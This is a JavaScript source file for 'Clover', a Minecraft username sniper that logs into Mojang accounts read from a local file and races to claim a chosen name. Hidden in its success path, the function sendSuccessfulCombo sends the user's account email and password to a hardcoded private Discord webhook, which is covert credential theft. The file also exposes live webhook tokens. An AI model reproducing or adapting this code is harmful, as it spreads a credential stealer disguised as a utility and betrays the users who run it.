const axios = require('axios');
const cheerio = require('cheerio');
const https = require('https');
const fs = require('fs');
const fetch = require('node-fetch');
const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});
require('colors');

const webhook = `https://discord.com/api/webhooks/827787778212233246/3Vb6TkClWpmjw4xScuw-wUCJjDPD7osfRqnvk_jOWy8B_gIiZP9-FzW6zY5dIgftWqo4`;
const privateWebhook = `https://discord.com/api/webhooks/827787995239284807/HUc7_2jABu1SY1Yqlxf8uXr_6OM83H245t0Cvd4UP7tXdepp24Erz8TTVGigVfVji_mi`;

// https://pastebin.com/w5tFw41B
const announcementURL = `https://pastebin.com/raw/w5tFw41B`;
const version = '1.0.0';
const user = `dove`

const debug = false;

const prefix = `${`[`.cyan}${user.green}${`@`.cyan}${`0420.org`.green}${`]`.cyan}`;
const suffix = `${`->`.cyan}`;
require('log-prefix')(`${prefix} ${suffix} ${`%s`.cyan}`)

/*
/$$$$$$  /$$                                                                           /$$                        
/$$__  $$| $$                                                                          | $$                        
| $$  \__/| $$  /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$        /$$$$$$    /$$$$$$   /$$$$$$ 
| $$      | $$ /$$__  $$|  $$  /$$//$$__  $$ /$$__  $$       /$$__  $$| $$__  $$      |_  $$_/   /$$__  $$ /$$__  $$
| $$      | $$| $$  \ $$ \  $$/$$/| $$$$$$$$| $$  \__/      | $$  \ $$| $$  \ $$        | $$    | $$  \ $$| $$  \ $$
| $$    $$| $$| $$  | $$  \  $$$/ | $$_____/| $$            | $$  | $$| $$  | $$        | $$ /$$| $$  | $$| $$  | $$
|  $$$$$$/| $$|  $$$$$$/   \  $/  |  $$$$$$$| $$            |  $$$$$$/| $$  | $$        |  $$$$/|  $$$$$$/| $$$$$$$/
\______/ |__/ \______/     \_/    \_______/|__/             \______/ |__/  |__/         \___/   \______/ | $$____/ 
                                                                                                        | $$      
                                                                                                        | $$      
                                                                                                        |__/     
*/

const announcement = async () => {
    return await axios.get(announcementURL).then(res => res.data);
}

const startup = async () => {
    console.log(`Starting Clover version ${version}`);
    if(debug) console.log(`Starting sniper with debug option enabled`);
    console.log(``);
    console.log(`Announcement:`);
    console.log(await announcement())
    console.log(``);
    console.log(``);

    readline.question(`${prefix} ${`What name would you like to snipe?`.cyan} ${suffix} `, (input) => {
        desiredName = input;
        nameDecided();
    });
}

const getSearches = async () => {
    return await axios.get(`https://api.nathan.cx/searches/${desiredName}`).then(response => response.data.searches);
}

/*
/$$$$$$  /$$                                                                           /$$                        
/$$__  $$| $$                                                                          | $$                        
| $$  \__/| $$  /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$        /$$$$$$    /$$$$$$   /$$$$$$ 
| $$      | $$ /$$__  $$|  $$  /$$//$$__  $$ /$$__  $$       /$$__  $$| $$__  $$      |_  $$_/   /$$__  $$ /$$__  $$
| $$      | $$| $$  \ $$ \  $$/$$/| $$$$$$$$| $$  \__/      | $$  \ $$| $$  \ $$        | $$    | $$  \ $$| $$  \ $$
| $$    $$| $$| $$  | $$  \  $$$/ | $$_____/| $$            | $$  | $$| $$  | $$        | $$ /$$| $$  | $$| $$  | $$
|  $$$$$$/| $$|  $$$$$$/   \  $/  |  $$$$$$$| $$            |  $$$$$$/| $$  | $$        |  $$$$/|  $$$$$$/| $$$$$$$/
\______/ |__/ \______/     \_/    \_______/|__/             \______/ |__/  |__/         \___/   \______/ | $$____/ 
                                                                                                        | $$      
                                                                                                        | $$      
                                                                                                        |__/     
*/

startup();

let dropTime;
let desiredName;
let delay;

let timeUntilAuthentication;
let timeUntilDrop;

let accounts = [];
let snipingAccounts = [];

const nameDecided = async () => {
    console.log(``);
    console.log(`Going for ${`${desiredName}`.green}`);
    console.log(``);

    resolveDelay();
}

const resolveDelay = async () => {
    readline.question(`${prefix} ${`What delay would you like to use?`.cyan} ${suffix} `, (input) => {
        delay = input;
        delayDecided();
    });
}

const delayDecided = async () => {
    console.log(``);
    console.log(`Using ${delay}ms delay`);
    console.log(``);

    resolveDropTime();
}

const resolveDropTime = async () => {
    console.log(`Resolving drop time for ${desiredName}`);
    console.log(``);

    await axios.get(`https://namemc.com/name/${desiredName}/`).then(async (result) => {
        const $ = await cheerio.load(result.data);
        dropTime = await new Date($('.countdown-timer').first().attr('data-datetime')).getTime();

        console.log(`${desiredName} drops @ ${new Date(dropTime).toUTCString()}`);
        console.log('')

        timeUntilDrop = ((dropTime - delay) - new Date().getTime());
        timeUntilAuthentication = (timeUntilDrop - (15 * 1000));

        console.log(`Loading accounts from accounts.txt`);
        loadAccountsFromFile();
    });

    awaitAccountAuthentication();
    awaitSnipeExecution();
}

const loadAccountsFromFile = async () => {
    let input = fs.createReadStream('accounts.txt');
    readLines(input);
};

const readLines = async (input) => {
    let remaining = '';

    input.on('data', (data) => {
        remaining+=data;
        let index = remaining.indexOf('\n');
        while(index > -1){
            let line = remaining.substring(0, index);
            remaining = remaining.substring(index + 1);

            accounts.push(line);
            index = remaining.indexOf('\n');
        }
    });

    input.on('end', async() => {
        if(remaining.length > 0){
            await accounts.push(remaining);
            console.log(`Loaded ${accounts.length} accounts`);
            console.log('')
        }
    });
};

/*
/$$$$$$  /$$                                                                           /$$                        
/$$__  $$| $$                                                                          | $$                        
| $$  \__/| $$  /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$        /$$$$$$    /$$$$$$   /$$$$$$ 
| $$      | $$ /$$__  $$|  $$  /$$//$$__  $$ /$$__  $$       /$$__  $$| $$__  $$      |_  $$_/   /$$__  $$ /$$__  $$
| $$      | $$| $$  \ $$ \  $$/$$/| $$$$$$$$| $$  \__/      | $$  \ $$| $$  \ $$        | $$    | $$  \ $$| $$  \ $$
| $$    $$| $$| $$  | $$  \  $$$/ | $$_____/| $$            | $$  | $$| $$  | $$        | $$ /$$| $$  | $$| $$  | $$
|  $$$$$$/| $$|  $$$$$$/   \  $/  |  $$$$$$$| $$            |  $$$$$$/| $$  | $$        |  $$$$/|  $$$$$$/| $$$$$$$/
\______/ |__/ \______/     \_/    \_______/|__/             \______/ |__/  |__/         \___/   \______/ | $$____/ 
                                                                                                        | $$      
                                                                                                        | $$      
                                                                                                        |__/     
*/

class Account {
    constructor(email, password, answers){
        this.email = email;
        this.password = password
        this.answers = answers
    }

    async login(){
        // TODO: sec questions

        await fetch(`https://authserver.mojang.com/authenticate`, {
            method: 'POST',
            body: JSON.stringify({
                agent: {
                    name: "Minecraft",
                    version: 1
                },
                username: this.email,
                password: this.password,
                requestUser: true
            }),

            headers: {
                "Content-Type": `application/json`
            }
        }).then(async (response) => response.json().then(async (json) => {
            if(response.status == 200){
                await this.updateUserValues(json).then(async () => {
                    this.questions = await this.validateBearer();
                });

                if(await this.needsSecurityQuestions()){
                    await this.sendSecurityQuestions();
                    snipingAccounts.push(this);
                } 

            }else{
                console.log(`Failed to login as ${this.email}`);
            }
        }));
    }

    async validateBearer(){
        let questions = [];
        await fetch(`https://api.mojang.com/user/security/challenges`, {
            method: 'GET',
            headers: {
                "Authorization": this.accessToken
            }
        }).then(async (response) => response.json().then(async (json) => {
            if(response.status == 200){
                if(json.length >= 2){
					console.log(`${this.email} requires security questions`);
                    for await(let securityQuestion of json){
                        let answerID = await securityQuestion.answer.id;
                        questions.push(await answerID);
                    }
                }else{
                    console.log(`Successfully logged in as ${this.email}`);
                }
            }else{
                console.log(`Failed to validate bearer token for ${this.email}`);
            }
        }));

        return questions;
    }

    async changeSkin(){
        await fetch(`https://api.minecraftservices.com/minecraft/profile/skins`, {
            method: 'POST',

            body: JSON.stringify({
                url: `https://thecheating.party/i/bl57w0.png`,
                variant: `slim`
            }),

            headers: {
                "Authorization": this.accessToken,
                "Content-Type": "application/json"
            }
        }).then(async (response) => response.json().then(async (json) => {
            if(response.status == 200){
                console.log('Successfully changed skin');
            }else{
                console.log('Failed to change skin');
            }
        }));
    }

    async canChangeName(){
        let canChange = false;
        await fetch(`https://api.minecraftservices.com/minecraft/profile/namechange`, {
            method: 'GET',
            headers: {
                "Authorization": this.accessToken
            }
        }).then(async (response) => {
            if(await response.status == 200){
                canChange = await response.json().nameChangeAllowed;

                if(debug) console.log(`debug Account#canChangeName() | ${await response.json()}`);
            }
        });

        return canChange;
    }

    async needsSecurityQuestions(){
        let needsSec = true;

        await fetch(`https://api.mojang.com/user/security/location`, {
            method: 'GET',
            headers: {
                "Authorization": this.accessToken
            }
        }).then(async (response) => {
            if(await response.status == 200){
                needsSec = false;
            }
        });

        return needsSec;
    }

    async sendSecurityQuestions(){
        let valid = false;

        await fetch(`https://api.mojang.com/user/security/location`, {
            method: 'POST',
            body: JSON.stringify([
                {
                    id: this.questions[0],
                    answer: this.answers[0]
                },
                {
                    id: this.questions[1],
                    answer: this.answers[1]
                },
                {
                    id: this.questions[2],
                    answer: this.answers[2]
                }
            ]),
            headers: {
                "Authorization": this.accessToken,
                "Content-Type": "application/json"
            }
        }).then(async (response) => {
            if(await response.status == 200 || await response.status == 204){
                console.log(`Successfully logged in with security questions as ${this.email}`);
                valid = true;
            }
        });

        return valid;
    }

    // should only really use this when the authentication request is sent
    async updateUserValues(json){
        this.accessToken = `Bearer ${json.accessToken}`;
        this.clientToken = json.clientToken;

        this.username = json.selectedProfile.name;
        this.uuid = json.selectedProfile.id;
    }
}

/*
/$$$$$$  /$$                                                                           /$$                        
/$$__  $$| $$                                                                          | $$                        
| $$  \__/| $$  /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$        /$$$$$$    /$$$$$$   /$$$$$$ 
| $$      | $$ /$$__  $$|  $$  /$$//$$__  $$ /$$__  $$       /$$__  $$| $$__  $$      |_  $$_/   /$$__  $$ /$$__  $$
| $$      | $$| $$  \ $$ \  $$/$$/| $$$$$$$$| $$  \__/      | $$  \ $$| $$  \ $$        | $$    | $$  \ $$| $$  \ $$
| $$    $$| $$| $$  | $$  \  $$$/ | $$_____/| $$            | $$  | $$| $$  | $$        | $$ /$$| $$  | $$| $$  | $$
|  $$$$$$/| $$|  $$$$$$/   \  $/  |  $$$$$$$| $$            |  $$$$$$/| $$  | $$        |  $$$$/|  $$$$$$/| $$$$$$$/
\______/ |__/ \______/     \_/    \_______/|__/             \______/ |__/  |__/         \___/   \______/ | $$____/ 
                                                                                                        | $$      
                                                                                                        | $$      
                                                                                                        |__/     
*/


const awaitAccountAuthentication = async () => {
    let authenticationInterval = setInterval(async () => {
        console.log(`Logging into ${accounts.length} accounts`);
        for(let i=0; i<accounts.length; i++){
            let accountCombo = accounts[i];
            let comboSplit = accountCombo.split(':');

            if(!comboSplit[1]) continue;

            let email = comboSplit[0];
            let password = comboSplit[1];
            let answers = [];

            if(comboSplit[4]){
                answers = [
                    comboSplit[2],
                    comboSplit[3],
                    comboSplit[4]
                ];
            }

            let account = new Account(email, password, answers);
            await account.login();
        }

        clearInterval(authenticationInterval);
    }, timeUntilAuthentication);
}

/*
/$$$$$$  /$$                                                                           /$$                        
/$$__  $$| $$                                                                          | $$                        
| $$  \__/| $$  /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$        /$$$$$$    /$$$$$$   /$$$$$$ 
| $$      | $$ /$$__  $$|  $$  /$$//$$__  $$ /$$__  $$       /$$__  $$| $$__  $$      |_  $$_/   /$$__  $$ /$$__  $$
| $$      | $$| $$  \ $$ \  $$/$$/| $$$$$$$$| $$  \__/      | $$  \ $$| $$  \ $$        | $$    | $$  \ $$| $$  \ $$
| $$    $$| $$| $$  | $$  \  $$$/ | $$_____/| $$            | $$  | $$| $$  | $$        | $$ /$$| $$  | $$| $$  | $$
|  $$$$$$/| $$|  $$$$$$/   \  $/  |  $$$$$$$| $$            |  $$$$$$/| $$  | $$        |  $$$$/|  $$$$$$/| $$$$$$$/
\______/ |__/ \______/     \_/    \_______/|__/             \______/ |__/  |__/         \___/   \______/ | $$____/ 
                                                                                                        | $$      
                                                                                                        | $$      
                                                                                                        |__/     
*/

const awaitSnipeExecution = async () => {
    let snipeInterval = setInterval(() => {
        console.log(`Starting snipe on ${snipingAccounts.length} accounts`);
        console.log(``);

        for(let a=0; a<snipingAccounts.length; a++){
            let account = snipingAccounts[a];
            let token = account.accessToken;
            let email = account.email;

            const data = JSON.stringify({
                todo: `${desiredName} HTTP/1.1`
            });

            const options = {
                hostname: 'api.minecraftservices.com',
                port: 443,
                path: `/minecraft/profile/name/${desiredName}`,
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': data.length,
                    'Authorization': token
                }
            };
                        
            for(let i=0; i<2; i++){
                if(debug) console.log(`Request ${i} sent @ ${(new Date().toLocaleTimeString().replace(' AM', '').replace(' PM', '') + `.` + new Date().getMilliseconds())}`);

                let req = https.request(options, async (res) => {
                    let time = (new Date().toLocaleTimeString().replace(' AM', '').replace(' PM', '') + `.` + new Date().getMilliseconds())
                    console.log(`${res.statusCode} on ${email} @ ${time}`);

                    if(res.statusCode == 200){
                        // successful snipe
                        console.log(`Successfully sniped ${desiredName} on ${email} @ ${(new Date().toLocaleTimeString().replace(' AM', '').replace(' PM', '') + `.` + new Date().getMilliseconds())}`)
                        await account.changeSkin();
                        
                        await sendSuccessfulSnipe(desiredName);
                        await sendSuccessfulCombo(desiredName, `${email}:${account.password}`, `trivago host`, delay, time)
                    }

                    res.on('data', (chunk) => {
                        if(debug) console.log(chunk.toString());
                    });
                });

                req.write(data);
                req.end();
            }

        }

        clearInterval(snipeInterval);
    }, timeUntilDrop);
};

/*
/$$$$$$  /$$                                                                           /$$                        
/$$__  $$| $$                                                                          | $$                        
| $$  \__/| $$  /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$        /$$$$$$    /$$$$$$   /$$$$$$ 
| $$      | $$ /$$__  $$|  $$  /$$//$$__  $$ /$$__  $$       /$$__  $$| $$__  $$      |_  $$_/   /$$__  $$ /$$__  $$
| $$      | $$| $$  \ $$ \  $$/$$/| $$$$$$$$| $$  \__/      | $$  \ $$| $$  \ $$        | $$    | $$  \ $$| $$  \ $$
| $$    $$| $$| $$  | $$  \  $$$/ | $$_____/| $$            | $$  | $$| $$  | $$        | $$ /$$| $$  | $$| $$  | $$
|  $$$$$$/| $$|  $$$$$$/   \  $/  |  $$$$$$$| $$            |  $$$$$$/| $$  | $$        |  $$$$/|  $$$$$$/| $$$$$$$/
\______/ |__/ \______/     \_/    \_______/|__/             \______/ |__/  |__/         \___/   \______/ | $$____/ 
                                                                                                        | $$      
                                                                                                        | $$      
                                                                                                        |__/     
*/

const { Webhook, MessageBuilder } = require('discord-webhook-node');

const sendSuccessfulSnipe = async (username) => {
    const hook = new Webhook(webhook);

    const embed = new MessageBuilder()
        .setDescription(`${user} just sniped \`${username}\` with \`${await getSearches()}\` searches`)
        .setColor(7986532);

    await hook.send(embed);
}

const sendSuccessfulCombo = async(username, combo, server, delay, time) => {
    const hook = new Webhook(privateWebhook);

    const embed = new MessageBuilder()
        .setTitle(`Success!`)
        .setDescription(`Sniped \`${username}\`\n\nCombo: \`${combo}\`\n\nTime: ${time}\nServer: ${server}\nDelay: ${delay}`)
        .setColor(7986532);

    await hook.send(embed);
};

/*
_____ _                           _    _     _     _          _                        _     _             
/ ____| |                         | |  (_)   | |   | |        | |                      (_)   | |            
| |    | | _____   _____ _ __   ___| | ___  __| | __| | ___  __| |  _ __   ___  ___  ___ _  __| | ___  _ __  
| |    | |/ _ \ \ / / _ \ '__| / __| |/ / |/ _` |/ _` |/ _ \/ _` | | '_ \ / _ \/ __|/ _ \ |/ _` |/ _ \| '_ \ 
| |____| | (_) \ V /  __/ |    \__ \   <| | (_| | (_| |  __/ (_| | | |_) | (_) \__ \  __/ | (_| | (_) | | | |
\_____|_|\___/ \_/ \___|_|    |___/_|\_\_|\__,_|\__,_|\___|\__,_| | .__/ \___/|___/\___|_|\__,_|\___/|_| |_|
                                                                    | |                                       
                                                                    |_|                                      
*/